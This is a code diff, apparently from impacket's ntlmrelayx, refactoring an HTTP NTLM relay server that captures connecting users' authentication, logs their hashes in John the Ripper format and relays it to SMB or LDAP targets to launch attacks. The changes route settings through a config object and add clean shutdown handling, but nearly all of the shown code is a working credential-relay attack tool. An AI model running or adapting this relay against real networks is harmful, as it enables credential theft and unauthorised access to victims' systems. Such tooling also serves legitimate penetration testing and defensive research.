@@ -29,21 +29,10 @@ from impacket.spnego import SPNEGO_NegTokenResp
 from impacket.smbserver import outputToJohnFormat, writeJohnOutputToFile
 from impacket.nt_errors import STATUS_ACCESS_DENIED, STATUS_SUCCESS
 
-
 class HTTPRelayServer(Thread):
     class HTTPServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer):
         def __init__(self, server_address, RequestHandlerClass, config):
             self.config = config
-            #Copy required settings from the config
-            #This is because old config passed all variables manually 
-            #and the code still depends on that (TODO: Fix this)
-            self.target = self.config.target
-            self.exeFile = self.config.exeFile
-            self.command = self.config.command
-            self.mode = self.config.mode
-            self.outputFile = self.config.outputFile
-            self.redirecthost = self.config.redirecthost
-
             SocketServer.TCPServer.__init__(self,server_address, RequestHandlerClass)
 
     class HTTPHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
@@ -57,9 +46,9 @@ class HTTPRelayServer(Thread):
             self.machineHashes = None
             self.domainIp = None
             self.authUser = None
-            if self.server.mode != 'REDIRECT':
-                if self.server.target is not None:
-                    self.target = self.server.target.get_target(client_address[0],self.server.config.randomtargets)
+            if self.server.config.mode != 'REDIRECT':
+                if self.server.config.target is not None:
+                    self.target = self.server.config.target.get_target(client_address[0],self.server.config.randomtargets)
                     logging.info("HTTPD: Received connection from %s, attacking target %s" % (client_address[0] ,self.target[1]))
                 else:
                     self.target = self.client_address[0]
@@ -69,6 +58,8 @@ class HTTPRelayServer(Thread):
         def handle_one_request(self):
             try:
                 SimpleHTTPServer.SimpleHTTPRequestHandler.handle_one_request(self)
+            except KeyboardInterrupt:
+                raise
             except Exception, e:
                 logging.error('Exception in HTTP request handler: %s' % e)
 
@@ -101,14 +92,14 @@ class HTTPRelayServer(Thread):
         def do_SMBREDIRECT(self):
             self.send_response(302)
             self.send_header('Content-type', 'text/html')
-            self.send_header('Location','file://%s' % self.server.redirecthost)
+            self.send_header('Location','file://%s' % self.server.config.redirecthost)
             self.send_header('Content-Length','0')
             self.send_header('Connection','close')
             self.end_headers()
 
         def do_GET(self):
             messageType = 0
-            if self.server.mode == 'REDIRECT':
+            if self.server.config.mode == 'REDIRECT':
                 self.do_SMBREDIRECT()
                 return
 
@@ -127,7 +118,7 @@ class HTTPRelayServer(Thread):
             if messageType == 1:
                 if not self.do_ntlm_negotiate(token):
                     #Connection failed
-                    self.server.target.log_target(self.client_address[0],self.target)
+                    self.server.config.target.log_target(self.client_address[0],self.target)
                     self.do_REDIRECT()
             elif messageType == 3:
                 authenticateMessage = ntlm.NTLMAuthChallengeResponse()
@@ -137,7 +128,7 @@ class HTTPRelayServer(Thread):
 
                     #Only skip to next if the login actually failed, not if it was just anonymous login or a system account which we don't want
                     if authenticateMessage['user_name'] != '': # and authenticateMessage['user_name'][-1] != '$':
-                        self.server.target.log_target(self.client_address[0],self.target)
+                        self.server.config.target.log_target(self.client_address[0],self.target)
                         #No anonymous login, go to next host and avoid triggering a popup
                         self.do_REDIRECT()
                     else:
@@ -148,15 +139,16 @@ class HTTPRelayServer(Thread):
                     logging.info("Authenticating against %s as %s\%s SUCCEED" % (self.target[1],authenticateMessage['domain_name'], authenticateMessage['user_name']))
                     ntlm_hash_data = outputToJohnFormat( self.challengeMessage['challenge'], authenticateMessage['user_name'], authenticateMessage['domain_name'], authenticateMessage['lanman'], authenticateMessage['ntlm'] )
                     logging.info(ntlm_hash_data['hash_string'])
-                    if self.server.outputFile is not None:
-                        writeJohnOutputToFile(ntlm_hash_data['hash_string'], ntlm_hash_data['hash_version'], self.server.outputFile)
-                    self.server.target.log_target(self.client_address[0],self.target)
+                    if self.server.config.outputFile is not None:
+                        writeJohnOutputToFile(ntlm_hash_data['hash_string'], ntlm_hash_data['hash_version'], self.server.config.outputFile)
+                    self.server.config.target.log_target(self.client_address[0],self.target)
                     self.do_attack()
                     # And answer 404 not found
                     self.send_response(404)
                     self.send_header('WWW-Authenticate', 'NTLM')
                     self.send_header('Content-type', 'text/html')
                     self.send_header('Content-Length','0')
+                    self.send_header('Connection','close')
                     self.end_headers()
             return 
 
@@ -164,7 +156,7 @@ class HTTPRelayServer(Thread):
             if self.target[0] == 'SMB':
                 try:
                     self.client = SMBRelayClient(self.target[1], extended_security = True)
-                    self.client.setDomainAccount(self.machineAccount, self.machineHashes, self.domainIp)
+                    self.client.setDomainAccount(self.server.config.machineAccount, self.server.config.machineHashes, self.server.config.domainIp)
                     self.client.set_timeout(10)
                     negotiate = ntlm.NTLMAuthNegotiate()
                     negotiate.fromString(token)
@@ -274,7 +266,7 @@ class HTTPRelayServer(Thread):
 
         def do_attack(self):
             if self.target[0] == 'SMB':
-                clientThread = self.server.config.attacks['SMB'](self.server.config,self.client,self.server.exeFile,self.server.command)
+                clientThread = self.server.config.attacks['SMB'](self.server.config, self.client, self.authUser)
                 clientThread.start()
             if self.target[0] == 'LDAP' or self.target[0] == 'LDAPS':
                 clientThread = self.server.config.attacks['LDAP'](self.server.config, self.client, self.authUser)
@@ -294,4 +286,9 @@ class HTTPRelayServer(Thread):
     def run(self):
         logging.info("Setting up HTTP Server")
         httpd = self.HTTPServer(("", 80), self.HTTPHandler, self.config)
-        httpd.serve_forever()
+        try:
+             httpd.serve_forever()
+        except KeyboardInterrupt:
+             pass
+        logging.info('Shutting down HTTP Server')
+        httpd.server_close()
